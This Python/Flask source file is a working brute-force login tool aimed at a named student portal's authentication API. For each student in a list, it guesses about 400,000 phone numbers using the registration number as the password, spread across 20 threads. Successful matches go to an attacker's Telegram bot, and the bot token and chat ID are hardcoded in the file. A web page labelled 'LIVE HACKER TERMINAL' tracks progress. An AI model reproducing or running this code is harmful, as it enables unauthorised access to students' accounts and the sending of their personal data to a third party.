import requests
import time
import os
import threading
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, Response

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
CHAT_ID = os.environ.get("CHAT_ID", "1634075045")

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 
THREADS = 20 

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

# MEMORY ME LIVE LOGS RAKHNE KE LIYE (Last 50 logs)
live_logs = []
current_reg = "Starting..."
total_scanned = 0
total_to_scan = 400000

def add_log(text):
    global live_logs
    # Time ke saath log add karo
    log_line = f"[{time.strftime('%H:%M:%S')}] {text}"
    live_logs.append(log_line)
    if len(live_logs) > 50: # Sirf last 50 dikhao
        live_logs.pop(0)
    print(log_line, flush=True)

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def check(phone, password):
    try:
        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
        data = r.json() if r.text else {}
        success = "student" in data or "user" in data or ("token" in data and "name" in data)
        return {"status": r.status_code, "success": success, "phone": phone}
    except Exception:
        return {"status": "ERROR", "success": False, "phone": phone}

def process_student(index, reg_no, last4):
    global current_reg, total_scanned, total_to_scan
    current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
    total_scanned = 0
    
    add_log(f"==========================================")
    add_log(f"TARGET START: {reg_no} (Ending: {last4})")
    add_log(f"==========================================")
    
    prefixes = [f"{digit}{i:05d}" for digit in ['6', '7', '8', '9'] for i in range(100000)]
    total_to_scan = len(prefixes)
    
    found_phone = None
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(check, prefix + last4, reg_no): prefix for prefix in prefixes}
        
        for future in as_completed(futures):
            total_scanned += 1
            res = future.result()
            
            if res["success"]:
                found_phone = res["phone"]
                add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
                break
            
            # Har request ka status (Exactly CMD jaisa)
            if res["status"] == 401:
                add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: 401")
            elif res["status"] == 200:
                add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: 200 (No Data)")
            elif res["status"] == "ERROR":
                add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: ERROR")

    if not found_phone:
        add_log(f"❌ NO MATCH for {reg_no}")
        send_telegram_msg(f"[{index}] {reg_no}    no match number found")
        
    send_telegram_msg("--------------------------------\nNext target...")

def run_hunter():
    time.sleep(3)
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        add_log(f"Total {len(lines)} students mil gaye. Scanning shuru...")
        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students.")
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                process_student(i, parts[0], parts[1])
                
        send_telegram_msg("✅ Saare students process ho gaye!")
    except Exception as e:
        add_log(f"Error: {e}")

# YE ROUTE BROWSER ME TERMINAL UI BANAYEGA
@app.route('/')
def home():
    html = f"""
    <html>
    <head>
        <title>Live Scanner</title>
        <style>
            body {{
                background-color: #0d1117;
                color: #00ff00;
                font-family: 'Consolas', 'Courier New', monospace;
                margin: 0;
                padding: 20px;
            }}
            h3 {{ color: #ffffff; border-bottom: 1px solid #333; padding-bottom: 10px; }}
            .stats {{ color: #00bfff; font-size: 18px; margin-bottom: 20px; }}
            #terminal {{
                background-color: #000;
                padding: 15px;
                border-radius: 5px;
                border: 1px solid #333;
                height: 70vh;
                overflow-y: auto;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
            }}
            .log-line {{ margin: 2px 0; font-size: 14px; }}
            .success {{ color: #00ff00; font-weight: bold; }}
            .error {{ color: #ff3333; }}
            .info {{ color: #ffff00; }}
        </style>
        <script>
            // Page ko auto-refresh karo bina flash hone ke
            setInterval(function() {{
                fetch('/logs')
                .then(response => response.json())
                .then(data => {{
                    document.getElementById('reg').innerText = data.current_reg;
                    document.getElementById('scanned').innerText = data.scanned;
                    document.getElementById('total').innerText = data.total;
                    
                    let term = document.getElementById('terminal');
                    term.innerHTML = '';
                    data.logs.forEach(line => {{
                        let div = document.createElement('div');
                        div.className = 'log-line';
                        if(line.includes('✅')) div.classList.add('success');
                        else if(line.includes('❌') || line.includes('ERROR')) div.classList.add('error');
                        else if(line.includes('TARGET')) div.classList.add('info');
                        div.innerText = line;
                        term.appendChild(div);
                    }});
                    // Auto scroll to bottom
                    term.scrollTop = term.scrollHeight;
                }});
            }}, 2000); // Har 2 second me update
        </script>
    </head>
    <body>
        <h3>💻 LIVE HACKER TERMINAL</h3>
        <div class="stats">
            <b>Target:</b> <span id="reg" style="color:#fff;">{current_reg}</span><br>
            <b>Scanned:</b> <span id="scanned" style="color:#fff;">{total_scanned}</span> / <span id="total" style="color:#fff;">{total_to_scan}</span>
        </div>
        <div id="terminal">
            <div class="log-line info">Loading logs...</div>
        </div>
    </body>
    </html>
    """
    return html

# API ENDPOINT JO LOGS KA DATA DEGA
@app.route('/logs')
def get_logs():
    return {"current_reg": current_reg, "scanned": total_scanned, "total": total_to_scan, "logs": live_logs}

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
